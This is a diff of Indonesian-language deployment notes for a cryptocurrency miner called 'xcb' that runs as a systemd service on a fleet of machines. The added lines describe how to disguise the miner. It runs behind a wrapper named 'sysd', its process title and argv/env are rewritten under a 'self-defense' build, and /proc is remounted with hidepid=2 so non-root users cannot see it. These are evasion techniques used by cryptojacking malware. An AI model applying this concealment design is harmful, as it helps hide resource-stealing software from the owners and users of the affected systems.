@@ -164,8 +164,14 @@ Job CI yang harus hijau:
 - Environment: `/etc/xcb/miner.env` (mode 600, tidak di repo).
 - `ExecStartPre` menolak `WALLET`/`WORKER` placeholder dan `CONN_POOL` kosong.
 - `ExecStart` memakai wrapper `/usr/local/sbin/sysd` (0700 root); wrapper
-  membaca `WORKER`/`THREADS` dari env dan `exec` `xcb`, sehingga unit metadata
-  tidak memuat path binary, wallet, atau flag.
+  memvalidasi `WALLET`/`WORKER`, menyalin `WALLET` tanpa suffix `.worker` ke
+  `CONN_ADDRESS`, dan `exec` `xcb`, sehingga unit metadata tidak memuat path
+  binary, wallet, atau flag. `THREADS` kosong berarti auto.
+- `XCB_TITLE=sysd` di `miner.env` mengganti comm dan mengosongkan argv/env,
+  tetapi hanya pada build `ENABLE_SELF_DEFENSE=ON`.
+- `xcb-proc-hidepid.service` + drop-in `10-hidepid.conf` me-remount `/proc`
+  dengan `hidepid=2` sebelum `syscached`, sehingga user non-root tidak melihat
+  proses root. `ops/fleet/install.sh` memasang keduanya.
 - `EnvironmentFile` sengaja tanpa prefix `-`: file hilang = service gagal start,
   bukan diam-diam memakai default.
 
